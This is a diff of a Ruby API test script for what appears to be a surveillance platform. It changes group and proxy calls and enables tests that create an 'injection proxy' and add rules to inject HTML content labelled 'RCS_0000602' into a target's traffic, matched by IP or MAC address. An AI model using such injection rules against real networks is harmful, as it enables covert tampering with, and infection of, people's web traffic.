@@ -117,8 +117,8 @@ res = http.request_get('/user', {'Cookie' => cookie})
 test_user = JSON.parse(res.body)[0]
 
 # group.add_user
-group_user = {'group' => test_group['_id'], 'user' => test_user['_id']}
-res = http.request_post('/group/add_user', group_user.to_json, {'Cookie' => cookie}) 
+group_user = {user: {_id: test_user['_id']}}
+res = http.request_post("/group/add_user/#{test_group['_id']}", group_user.to_json, {'Cookie' => cookie}) 
 puts "group.add_user "
 puts res
 puts
@@ -137,8 +137,8 @@ puts res
 puts
 
 # group.del_user
-group_user = {'group' => test_group['_id'], 'user' => test_user['_id']}
-res = http.request_post('/group/del_user', group_user.to_json, {'Cookie' => cookie}) 
+group_user = {user: {_id: test_user['_id']}}
+res = http.request_post("/group/del_user/#{test_group['_id']}", group_user.to_json, {'Cookie' => cookie}) 
 puts "group.del_user "
 puts res
 puts
@@ -371,20 +371,20 @@ if false
   #end
   
   # proxy.create
-  #proxy = {name: 'test'}
-  #res = http.request_post('/proxy', proxy.to_json, {'Cookie' => cookie})
-  #puts "proxy.create"
-  #puts res
-  #puts
+  proxy = {name: 'test'}
+  res = http.request_post('/proxy', proxy.to_json, {'Cookie' => cookie})
+  puts "proxy.create"
+  puts res
+  puts
   
-  #test_proxy = JSON.parse(res.body)
+  test_proxy = JSON.parse(res.body)
   
   # proxy.update
-  #proxy = {name: 'IPA', address: '1.2.3.4', redirect: '4.3.2.1', desc: 'test injection proxy', port: 4445, poll: true}
-  #res = http.request_put("/proxy/#{test_proxy['_id']}", proxy.to_json, {'Cookie' => cookie}) 
-  #puts "proxy.update "
-  #puts res
-  #puts
+  proxy = {name: 'IPA', address: '1.2.3.4', redirect: '4.3.2.1', desc: 'test injection proxy', port: 4445, poll: true}
+  res = http.request_put("/proxy/#{test_proxy['_id']}", proxy.to_json, {'Cookie' => cookie}) 
+  puts "proxy.update "
+  puts res
+  puts
   
   # proxy.show
   res = http.request_get("/proxy/#{proxy_id}", {'Cookie' => cookie})
@@ -405,13 +405,12 @@ if false
   puts
   
 
-=begin
   # proxy.add_rule
   puts "proxy.add_rule"
-  rule = {_id: proxy_id, enabled: true, disable_sync: false, ident: 'STATIC-IP', 
+  rule = {rule: {enabled: true, disable_sync: false, ident: 'STATIC-IP', 
           ident_param: '14.11.78.4', probability: 100, resource: 'www.alor.it', 
-          action: 'INJECT-HTML', action_param: 'RCS_0000602', target: '4df8bc89963d3523c9000056'}
-  res = http.request_post("/proxy/add_rule", rule.to_json, {'Cookie' => cookie})
+          action: 'INJECT-HTML', action_param: 'RCS_0000602', target_id: '4e033ae62afb65e061000056'}}
+  res = http.request_post("/proxy/add_rule/#{proxy_id}", rule.to_json, {'Cookie' => cookie})
   rule = JSON.parse(res.body)
   puts rule
   puts
@@ -425,8 +424,8 @@ if false
   
   # proxy.update_rule
   puts "proxy.update_rule"
-  mod = {rule: rule['_id'], enabled: false, disable_sync: true, ident: 'STATIC-MAC',
-          ident_param: '00:11:22:33:44:55', target: '4df8bc89963d3523c9000056'}
+  mod = {rule: {_id: rule['_id'], enabled: false, disable_sync: true, ident: 'STATIC-MAC',
+          ident_param: '00:11:22:33:44:55', target_id: '4e033ae62afb65e061000056'}}
   res = http.request_post("/proxy/update_rule/#{proxy_id}", mod.to_json, {'Cookie' => cookie})
   puts res
   puts
@@ -440,7 +439,7 @@ if false
   
   # proxy.del_rule
   puts "proxy.del_rule"
-  request = {rule: rule['_id']}
+  request = {rule: {_id: rule['_id']}}
   res = http.request_post("/proxy/del_rule/#{proxy_id}", request.to_json, {'Cookie' => cookie})
   puts res
   puts
@@ -450,7 +449,7 @@ if false
   res = http.request_get("/proxy/config/#{proxy_id}", {'Cookie' => cookie})
   puts res
   puts
-=end
+
 end
 
 # collector
